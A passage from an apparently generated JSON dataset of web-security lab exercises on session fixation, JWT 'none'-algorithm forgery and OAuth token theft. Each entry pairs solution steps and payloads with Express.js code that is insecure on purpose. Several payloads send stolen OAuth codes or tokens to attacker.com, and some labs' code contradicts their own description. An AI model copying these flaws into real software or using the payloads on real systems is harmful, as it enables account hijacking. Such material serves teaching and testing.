    "GET /auth?redirect_uri=https://attacker.com/capture",
    "Extract access_token from redirect",
    "Authorization: Bearer abc123token",
    "GET /account with stolen token"
  ]
},
{
  "Lab scenario": "Session Fixation in legacy auth redirect endpoint",
  "Lab Description": "This lab's authentication mechanism improperly allows reuse of fixed session identifiers via a deprecated `/legacy-auth` endpoint. The application trusts the session cookie even before the login is completed. To solve: Fixate a valid session identifier for Carlos and access their account page post-authentication.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept a GET /login request and note the `Set-Cookie: sessionid=XYZ` header.",
    "Send a GET request to /legacy-auth?user=carlos with a predefined session cookie and observe that the session is accepted pre-login.",
    "Craft a session fixation payload using: Cookie: sessionid=attackersession; GET /legacy-auth?user=carlos",
    "In another browser/session, reuse attackersession to access /account and confirm elevated access.",
    "Verify lab completion by accessing /account with Carlos's session pre-set."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': { password: 'letmein', session: '' } }; app.get('/legacy-auth', (req, res) => { const { user } = req.query; if (users[user]) { users[user].session = req.cookies['sessionid']; res.send('Legacy session set'); } else { res.status(404).send('User not found'); } }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { res.cookie('sessionid', users[username].session || 'sess' + Math.random().toString(36)); res.send('Logged in'); } else { res.status(401).send('Login failed'); } }); app.get('/account', (req, res) => { const session = req.cookies['sessionid']; const user = Object.keys(users).find(u => users[u].session === session); if (user) { res.send('Welcome ' + user); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
  "payloads": [
    "GET /legacy-auth?user=carlos Cookie: sessionid=abc123",
    "GET /account Cookie: sessionid=abc123",
    "POST /login body: username=carlos&password=letmein"
  ]
},
{
  "Lab scenario": "JWT authentication bypass via 'none' algorithm",
  "Lab Description": "The application uses JWTs to authenticate users, but fails to verify the algorithm properly. If the algorithm is set to 'none', the signature is not validated, allowing attackers to forge arbitrary tokens. To solve: Forge a token granting admin access and view the admin panel.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to intercept the JWT from a valid login response and decode it at jwt.io.",
    "Modify the header to { \"alg\": \"none\" } and set payload { \"username\": \"admin\", \"role\": \"admin\" }.",
    "Remove the signature and re-encode the token.",
    "Use Burp Suite to replace the Authorization header with: Bearer <forged_token>.",
    "Access /admin-panel and verify that admin functions are exposed."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { 'admin': { password: 'supersecure' }, 'user': { password: 'password' } }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { const token = jwt.sign({ username, role: username === 'admin' ? 'admin' : 'user' }, 'secret'); res.json({ token }); } else { res.status(401).json({ error: 'Invalid login' }); } }); app.get('/admin-panel', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); if (payload.role === 'admin') return res.send('Admin panel accessed'); } else { const verified = jwt.verify(token, 'secret'); if (verified.role === 'admin') return res.send('Admin panel accessed'); } } catch (e) { return res.status(403).send('Invalid token'); } res.status(403).send('Unauthorized'); }); const PORT = 4001; app.listen(PORT, () => console.log(`JWT None Bypass Lab running at http://localhost:${PORT}`));",
  "payloads": [
    "JWT: header: { \"alg\": \"none\" }, payload: { \"username\": \"admin\", \"role\": \"admin\" }, no signature",
    "Authorization: Bearer <forged_token>",
    "GET /admin-panel"
  ]
},
{
  "Lab scenario": "OAuth code leakage via Referer header to third-party",
  "Lab Description": "The OAuth implementation leaks authorization codes via the Referer header when redirecting users back to a third-party site. This flaw allows attackers to intercept OAuth codes and obtain access tokens tied to victim accounts. To solve: Intercept Carlos’s OAuth code and reuse it to hijack their session.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to monitor the Referer headers during OAuth redirection to the third-party callback URL.",
    "Identify a logged-in request to /callback?code=XXX where the Referer contains the leaked OAuth code.",
    "Copy the code and replay the token exchange using Postman: POST /token with code=XXX, client_id, and redirect_uri.",
    "Use the access_token to call /user-info and confirm account takeover of Carlos.",
    "Access /account with Authorization: Bearer <access_token> to complete lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const oauthCodes = {}; const accessTokens = {}; app.get('/auth', (req, res) => { const code = Math.random().toString(36).substring(2); oauthCodes[code] = 'carlos'; res.redirect('http://third-party-site.com/callback?code=' + code); }); app.post('/token', (req, res) => { const { code, client_id, redirect_uri } = req.body; const user = oauthCodes[code]; if (user) { const token = Math.random().toString(36).substring(2); accessTokens[token] = user; res.json({ access_token: token }); } else { res.status(400).json({ error: 'Invalid code' }); } }); app.get('/user-info', (req, res) => { const auth = req.headers['authorization']; const token = auth && auth.split(' ')[1]; const user = accessTokens[token]; if (user) { res.send('User info for ' + user); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4002; app.listen(PORT, () => console.log(`OAuth Code Leakage Lab running at http://localhost:${PORT}`));",
  "payloads": [
    "GET /auth -> watch Referer to third-party for code leakage",
    "POST /token with stolen code",
    "GET /user-info Authorization: Bearer <stolen_access_token>",
    "GET /account Authorization: Bearer <stolen_access_token>"
  ]
},
{
  "Lab scenario": "Session fixation via path parameter injection in REST API",
  "Lab Description": "This lab's REST API session management mechanism is vulnerable to session fixation through path parameter injection. The application assigns session tokens based on user-supplied session IDs if present. To solve the lab, hijack Carlos's session and access his account page using a crafted session ID.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Intercept a normal login flow using Burp Suite and observe that the server accepts custom session IDs via /api/session/:sessionid path parameter.",
    "Use OWASP ZAP to confirm that a preset session ID like /api/session/fix1234 still logs you in under your own credentials.",
    "Craft a malicious URL with a known session ID like /api/session/fixcarlos and send it to the victim (or simulate the victim visiting it).",
    "Log in yourself using the same session ID via /api/session/fixcarlos and access /api/account.",
    "Verify successful session fixation by viewing Carlos's account page."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = { 'carlos': 'secret123', 'admin': 'adminpass' }; app.get('/api/session/:sid', (req, res) => { const sid = req.params.sid; sessions[sid] = sessions[sid] || { user: null }; res.cookie('sessionid', sid); res.send('Session initialized'); }); app.post('/api/login', (req, res) => { const sid = req.cookies.sessionid; const { username, password } = req.body; if (users[username] === password && sid) { sessions[sid].user = username; res.send('Login successful'); } else { res.status(401).send('Invalid'); } }); app.get('/api/account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid] && sessions[sid].user) { res.send('Account of ' + sessions[sid].user); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
  "payloads": [
    "/api/session/fixcarlos",
    "POST /api/login with sessionid=fixcarlos",
    "GET /api/account with sessionid=fixcarlos"
  ]
},
{
  "Lab scenario": "JWT key confusion attack using 'none' algorithm in GraphQL API",
  "Lab Description": "This GraphQL API-based authentication system fails to validate JWT signature algorithms properly. The backend accepts tokens signed with 'none' algorithm, assuming any token with valid claims is trustworthy. To solve the lab, forge a JWT token impersonating the admin and access the GraphQL /me endpoint.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Send a valid login mutation in GraphQL using Postman and inspect the returned JWT.",
    "Decode the JWT using jwt.io and observe it uses HS256 algorithm.",
    "Craft a new JWT with header {\"alg\":\"none\"} and payload {\"username\":\"admin\"}.",
    "Remove the signature completely and re-encode the token using base64url.",
    "Use Burp Suite to inject the forged token as Authorization: Bearer <token> and query /graphql { me { username } }.",
    "Confirm that the user is admin and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const users = { 'admin': 'adminpass', 'user': 'userpass' }; const secret = 'mysecret'; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token) { try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); req.user = decoded.username; } catch (e) { return res.status(403).send('Invalid token'); } } const query = req.body.query; if (query.includes('me')) { res.send({ data: { me: { username: req.user || 'guest' } } }); } else { res.status(400).send('Bad query'); } }); app.listen(4000);",
  "payloads": [
    "{\"alg\":\"none\"}.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
    "Authorization: Bearer <none-alg-token>",
    "GraphQL query: { me { username } }"
  ]
},
{
  "Lab scenario": "OAuth token reuse via insecure redirect_uri in authorization server",
  "Lab Description": "This OAuth implementation uses an insecure wildcard pattern in redirect_uri validation. This allows an attacker to reuse a stolen authorization code at their own domain. To solve the lab, intercept Carlos’s OAuth code and exchange it at your controlled redirect_uri to get his access token.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to initiate OAuth login and observe the redirect_uri validation mechanism.",
    "Discover that redirect_uri=https://attacker.com/callback is accepted due to wildcard *.trusted-oauth.com match.",
    "Simulate a phishing link containing Carlos’s authorization code sent to your malicious domain.",
    "Exchange this code using a POST request to the /token endpoint including your redirect_uri.",
    "Use the access_token to access /userinfo endpoint as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const authCodes = {}; const accessTokens = {}; const clients = [{ client_id: 'trusted', redirect_uri: '*.trusted-oauth.com' }]; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const validClient = clients.find(c => c.client_id === client_id && redirect_uri.includes(c.redirect_uri.replace('*', ''))); if (!validClient) return res.status(400).send('Invalid client'); const code = Math.random().toString(36).substring(2); authCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/token', (req, res) => { const { code, redirect_uri } = req.body; if (authCodes[code]) { const token = 'token-' + Math.random().toString(36).substring(2); accessTokens[token] = authCodes[code]; return res.json({ access_token: token }); } res.status(400).send('Invalid code'); }); app.get('/userinfo', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = accessTokens[token]; if (user) { res.json({ user }); } else { res.status(403).send('Invalid token'); } }); app.listen(5000);",
  "payloads": [
    "redirect_uri=https://attacker.com/callback",
    "GET /authorize?client_id=trusted&redirect_uri=https://attacker.com/callback",
    "POST /token with code=<stolen_code>&redirect_uri=https://attacker.com/callback",
    "Authorization: Bearer <access_token>"
  ]
},
{
  "Lab scenario": "Session fixation vulnerability in login session token",
  "Lab Description": "The application issues a session token before authentication, which is reused after login without regeneration. This allows session fixation attacks if an attacker sets the session cookie for the victim before login. The application accepts session cookies from unauthenticated users and does not reissue them after successful login. To solve: Fixate a session and gain unauthorized access to Carlos's account using the same token.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept the GET /login request with Burp Suite and observe the Set-Cookie header issuing sessionId.",
    "Send the login request with Burp Repeater using your own session cookie and complete login.",
    "Confirm that session ID does not change after login, indicating fixation is possible.",
    "Trick Carlos into logging in with the session ID you control (simulate by using same token pre-login).",
    "Use the same session ID in your browser to access Carlos's authenticated session and navigate to /my-account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'password123' }; app.get('/login', (req, res) => { const sid = req.cookies.sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionId] = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) res.send('Welcome to your account, ' + user); else res.status(403).send('Access denied'); }); app.listen(3000);",
  "payloads": [
    "sessionId=attacker-session-123",
    "POST /login with sessionId=attacker-session-123 and victim credentials",
    "Access /my-account with same fixed session cookie"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion vulnerability in token verification logic",
  "Lab Description": "This application relies on JWTs to authorize users, but does not enforce a strong algorithm during validation. The backend accepts JWTs with the 'alg' set to 'none', trusting the payload without verification. To solve: Forge a JWT with alg:none and impersonate Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Log in and intercept the Authorization: Bearer <JWT> header with Burp Suite.",
    "Copy the decoded header and payload of the token using jwt.io or Postman.",
    "Replace the alg value to none in the header and change the payload to {\"username\":\"carlos\"}.",
    "Remove the signature part of the token and resend the JWT via Burp Repeater.",
    "Access the /admin or /my-account endpoint using the forged token and confirm the lab is solved."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.username) res.send('Welcome ' + decoded.payload.username); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "{\"alg\":\"none\"}.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "Authorization: Bearer {header.payload.}",
    "GET /my-account with forged JWT"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in redirect_uri validation logic",
  "Lab Description": "The OAuth flow in this application allows arbitrary redirect URIs due to improper validation, enabling token redirection to attacker-controlled domains. The app does not validate the redirect_uri against a strict whitelist. To solve: Steal an access token from the OAuth provider by injecting a rogue redirect URI and impersonate Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Initiate the OAuth flow using Burp Suite or browser and note the authorization URL including redirect_uri.",
    "Replace redirect_uri with an attacker-controlled domain such as https://attacker.com/callback.",
    "Host a listener on your domain to capture the access token in the fragment/hash.",
    "Convince Carlos to click the OAuth URL with the manipulated redirect_uri (simulate manually).",
    "Extract the token and use it in a request to access Carlos's account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; const token = 'access-token-for-carlos'; const uri = `${redirect_uri}#access_token=${token}`; res.redirect(uri); }); app.get('/my-account', (req, res) => { const token = req.query.token; if (token === 'access-token-for-carlos') res.send('Welcome to Carlos account'); else res.status(403).send('Forbidden'); }); app.listen(5000);",
  "payloads": [
    "https://vulnerable.com/auth?client_id=xyz&redirect_uri=https://attacker.com/callback&response_type=token",
    "GET https://attacker.com/callback#access_token=access-token-for-carlos",
    "GET /my-account?token=access-token-for-carlos"
  ]
},
{
    "Lab scenario": "Session Fixation vulnerability in Login endpoint",
    "Lab Description": "This lab's session management is vulnerable to session fixation attacks. The application uses a predictable session ID mechanism. The attacker can set a session ID during login, forcing the user to use the attacker's session ID after login. To solve the lab, the attacker must hijack the session and access the victim's account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Launch Burp Suite and intercept a login request. Observe the session cookie sent in the response after a successful login.",
      "2. Log out of the application and try setting the session ID manually in the cookies header using Burp Suite's Intruder.",
      "3. In Burp Suite, craft a request where the session cookie is set to the attacker-controlled session ID and send the login request with the valid credentials.",
      "4. After successfully logging in, send a GET request to /account with the attacker-set session ID in the cookies. Verify that the attacker has hijacked the session and gained unauthorized access to the account.",
      "5. Verify by visiting the victim's account page and viewing the contents of the session (cookies or headers)."
    ],
    "Vulnerability name": "Session Management",
    "src code": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.post('/login', (req, res) => { const { username, password, sessionId } = req.body; if (username === 'victim' && password === 'password123') { res.cookie('sessionId', sessionId || 'default-session-id'); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { const sessionId = req.cookies.sessionId; if (sessions[sessionId]) { res.send('Account page for victim'); } else { res.send('Access denied'); } }); const PORT = 3000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "sessionId=attacker-session-id",
      "sessionId=default-session-id"
    ]
  },
  {
    "Lab scenario": "JWT Token manipulation in User Authentication",
    "Lab Description": "This lab's authentication mechanism is vulnerable to JWT manipulation. The application does not properly validate the signature of the JWT token. To solve the lab, the attacker needs to modify the JWT payload and bypass the authentication to access a protected resource.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a request that includes a JWT token in the Authorization header.",
      "2. Decode the JWT token using an online tool or Burp's Repeater to reveal the header and payload.",
      "3. Modify the payload to include an elevated privilege (e.g., change 'role' from 'user' to 'admin').",
      "4. Re-encode the modified JWT token, ensuring to use the same algorithm (e.g., HS256).",
      "5. Replace the existing JWT token with the newly crafted token in the request header and send the request again.",
      "6. Verify that the server now grants admin access, as indicated by the elevated privileges in the response."
    ],
    "Vulnerability name": "JWT Manipulation",
    "src code": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secretKey = 'mysecret'; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'victim' && password === 'password123') { const token = jwt.sign({ username: 'victim', role: 'user' }, secretKey, { expiresIn: '1h' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers['authorization']; if (token) { jwt.verify(token, secretKey, (err, decoded) => { if (err) { res.status(401).send('Unauthorized'); } else if (decoded.role === 'admin') { res.send('Admin dashboard'); } else { res.status(403).send('Forbidden'); } }); } else { res.status(401).send('Unauthorized'); } }); const PORT = 3000; app.listen(PORT, () => console.log('JWT Manipulation Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZpY3RpbSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA5NzMwMzc5LCJleHBpcmVzSW4iOjE2MDk3MzA1Nzd9.E0d9X_jVtxf_X8dAot68pWjI0In6ftchUt2lU8IX_Ng",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZpY3RpbSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwOTczMDM3OX0.VvJwlIa0Nrf4Z2u9-Q7VUPwexnInlCVdcub7ebxeVwE"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration and Access Token Manipulation",
    "Lab Description": "The OAuth implementation in this lab has a misconfiguration where the access token is not properly validated. This allows the attacker to exchange a manipulated access token for unauthorized access to protected resources. To solve the lab, the attacker needs to tamper with the token and bypass OAuth authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the request where the access token is being sent to the server for OAuth authorization.",
      "2. Observe the structure of the access token and its fields, including the 'client_id' and 'scope'.",
      "3. Modify the access token to change the 'client_id' and 'scope' fields to reflect a higher privilege level (e.g., change 'user' to 'admin').",
      "4. Re-send the modified token to the server to see if access is granted.",
      "5. If the server grants access, navigate to the protected resource and confirm that unauthorized access has been gained."
    ],
    "Vulnerability name": "OAuth Misconfiguration",
    "src code": "const express = require('express'); const app = express(); const OAuth2Server = require('oauth2-server'); const oauth = new OAuth2Server(); app.use(express.json()); app.post('/authorize', (req, res) => { const { token } = req.body; if (token === 'user-token') { res.send('Access granted to user resources'); } else if (token === 'admin-token') { res.send('Access granted to admin resources'); } else { res.status(401).send('Invalid token'); } }); app.post('/token', (req, res) => { const { client_id, client_secret } = req.body; if (client_id === 'client123' && client_secret === 'secret') { res.json({ access_token: 'user-token', token_type: 'bearer' }); } else { res.status(400).send('Invalid client credentials'); } }); const PORT = 3000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "access_token=user-token",
      "access_token=admin-token"
    ]
  },
{
  "Lab scenario": "Session Fixation via Predictable Token in REST Login Flow",
  "Lab Description": "The application uses a predictable session ID generation mechanism and does not regenerate sessions upon successful authentication. This allows an attacker to fixate a victim's session. The application leaks session tokens in login responses, and session IDs remain valid across login attempts. To solve: Hijack Carlos's session by fixating a known session and accessing /account/carlos.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept GET /session/init using Burp Suite to retrieve a session ID",
    "Send crafted login request using POST /login with victim's credentials but without regenerating the session",
    "Reuse the same session ID in a browser and send it to the victim",
    "Login as Carlos from attacker side using the fixated session",
    "Access /account/carlos with the stolen session cookie"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const crypto = require('crypto'); const app = express(); app.use(bodyParser.json()); app.use(cookieParser()); let sessions = {}; let users = [{ username: 'carlos', password: 'carlospass' }]; app.get('/session/init', (req, res) => { const sessionId = 'sess_' + crypto.randomBytes(2).toString('hex'); sessions[sessionId] = null; res.cookie('sessionId', sessionId); res.send('Session initialized'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies.sessionId; const user = users.find(u => u.username === username && u.password === password); if (user && sessionId in sessions) { sessions[sessionId] = username; return res.send('Login successful'); } res.status(401).send('Login failed'); }); app.get('/account/:user', (req, res) => { const sessionId = req.cookies.sessionId; if (sessions[sessionId] === req.params.user) return res.send(`Welcome ${req.params.user}`); res.status(403).send('Forbidden'); }); app.listen(3000, () => console.log('Session Fixation Lab running on http://localhost:3000'));",
  "payloads": [
    "GET /session/init",
    "POST /login { \"username\": \"carlos\", \"password\": \"carlospass\" } with stolen session cookie",
    "GET /account/carlos with fixated session cookie"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Bypass in GraphQL Login",
  "Lab Description": "The application's JWT implementation accepts tokens signed with the 'none' algorithm, making it vulnerable to token forgery. JWTs are used for GraphQL session authentication. To solve: Forge an admin JWT using the 'none' algorithm and access the admin dashboard via a GraphQL query.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Send a login mutation via GraphQL using Postman and inspect returned JWT",
    "Decode the JWT header and observe the use of HS256 algorithm",
    "Forge a new JWT with header {\"alg\":\"none\"} and payload {\"username\":\"admin\",\"role\":\"admin\"}",
    "Send GraphQL query with Authorization: Bearer <forged_token>",
    "Query { adminPanel { logs } } to verify access"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'supersecretkey'; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); if (decoded.role === 'admin') return res.json({ data: { adminPanel: { logs: 'Sensitive logs' } } }); res.status(403).send('Unauthorized'); } catch (err) { res.status(401).send('Invalid token'); } }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username, role: 'admin' }, SECRET); return res.json({ token }); } res.status(401).send('Login failed'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on http://localhost:4000'));",
  "payloads": [
    "JWT with header: {\"alg\":\"none\"}, payload: {\"username\":\"admin\",\"role\":\"admin\"}",
    "GraphQL query: { adminPanel { logs } }",
    "Authorization: Bearer <forged_token>"
  ]
},
{
  "Lab scenario": "OAuth Implicit Flow Token Theft via Referer Leak",
  "Lab Description": "The application implements OAuth implicit flow and includes a misconfigured redirect URI that leaks the access token via the Referer header. An attacker can craft a malicious endpoint to capture the token. To solve: Leak Carlos's access token using an exploit page and access his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Host a malicious HTML page that performs a redirect to the vulnerable OAuth callback with access_token in URL",
    "Send the link to Carlos to initiate OAuth login and redirect",
    "Capture the Referer header containing access_token from Carlos’s request",
    "Use the stolen access_token in Postman to access /account/profile",
    "Verify access to Carlos’s account using the token"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const users = { 'carlos': { token: 'abc123token', profile: 'Carlos profile info' } }; app.get('/oauth/callback', (req, res) => { const token = req.query.access_token; if (!token) return res.status(400).send('Missing token'); res.redirect('https://attacker.com/log?referer=' + req.headers.referer); }); app.get('/account/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = Object.keys(users).find(u => users[u].token === token); if (user) return res.send(users[user].profile); res.status(403).send('Access denied'); }); app.listen(5000, () => console.log('OAuth Implicit Flow Lab running on http://localhost:5000'));",
  "payloads": [
    "<script>window.location='http://vuln-app.com/oauth/callback#access_token=abc123token';</script>",
    "Authorization: Bearer abc123token",
    "GET /account/profile"
  ]
},
{
  "Lab scenario": "Session fixation through insecure cookie management in login endpoint",
  "Lab Description": "This lab's session management logic allows an attacker to fix a session ID before login. The application accepts external session identifiers via URL and sets them before authentication. To solve: hijack Carlos's session after forcing them to authenticate with a known session ID.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Using Burp Suite, intercept a GET /login?session=xyz123 request before authentication and observe the session cookie being set.",
    "2.Confirm that after login, the same session ID persists. This indicates fixation is possible.",
    "3.Trick the victim into logging in using a URL with a fixed session (e.g., /login?session=attacker-session-id).",
    "4.Login using the same session ID you forced Carlos to use.",
    "5.Access /my-account with that session to confirm session hijack."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'qwerty' }]; app.use((req, res, next) => { if (req.query.session) { res.cookie('sid', req.query.session); } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) return res.send('Login success'); return res.status(401).send('Invalid'); }); app.get('/my-account', (req, res) => { const session = req.cookies.sid; if (session === 'attacker-session-id') return res.send('Account accessed: carlos'); res.status(403).send('Access denied'); }); app.listen(4000);",
  "payloads": [
    "/login?session=attacker-session-id",
    "POST /login with credentials after session cookie fixed",
    "GET /my-account with sid=attacker-session-id"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion in token verification header",
  "Lab Description": "This lab uses JWTs for authentication but verifies tokens based on the 'alg' header provided in the token itself, allowing an attacker to bypass signature checks. To solve: forge a valid token that grants access to Carlos's account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Intercept an authenticated request using Burp Suite and extract the Authorization: Bearer JWT header.",
    "2.Decode the JWT using jwt.io or Burp Decoder and observe the header using 'RS256' algorithm.",
    "3.Modify the JWT header to 'alg':'none' and remove the signature.",
    "4.Change the payload sub field to 'carlos'.",
    "5.Send the forged JWT in Authorization header and access /my-account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const pubKey = 'PUBLIC_KEY_DUMMY'; const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ sub: username }, pubKey, { algorithm: 'RS256' }); res.json({ token }); } else res.status(401).json({ error: 'Invalid login' }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey, { algorithms: ['RS256', 'none'] }); if (decoded.sub === 'carlos') return res.send('Access granted to carlos'); } catch { return res.status(403).send('Unauthorized'); } res.status(403).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "JWT header: {\"alg\":\"none\"}",
    "JWT payload: {\"sub\":\"carlos\"}",
    "Send token with Authorization: Bearer [unsigned token]"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration allows token reuse via open redirect",
  "Lab Description": "This OAuth-based login flow has an open redirect on the callback endpoint, enabling token capture and reuse. The token is not scoped to specific redirect URIs. To solve: steal Carlos's access token and use it to access the /my-account endpoint.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Start Burp Suite and visit the OAuth login flow. Capture the redirect_uri parameter sent to the authorization server.",
    "2.Exploit the open redirect by setting redirect_uri to a controlled endpoint that leaks the token (e.g., https://attacker.com/capture#access_token=...).",
    "3.Send phishing link to Carlos to initiate OAuth login with malicious redirect_uri.",
    "4.Capture token from the attacker-controlled server logs or HTTP service.",
    "5.Reuse stolen token by sending Authorization: Bearer <token> to /my-account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos-token': 'carlos' }; app.get('/callback', (req, res) => { const redirect = req.query.redirect_uri; const user = req.query.user; if (user === 'carlos') { const token = 'carlos-token'; return res.redirect(`${redirect}#access_token=${token}`); } res.status(403).send('Login failed'); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; if (tokens[token] === 'carlos') return res.send('OAuth access granted to carlos'); res.status(403).send('Invalid token'); }); app.listen(4000);",
  "payloads": [
    "https://target.com/callback?redirect_uri=https://attacker.com/capture",
    "#access_token=carlos-token",
    "Authorization: Bearer carlos-token"
  ]
},
{
  "Lab scenario": "JWT signature confusion vulnerability in REST API login endpoint",
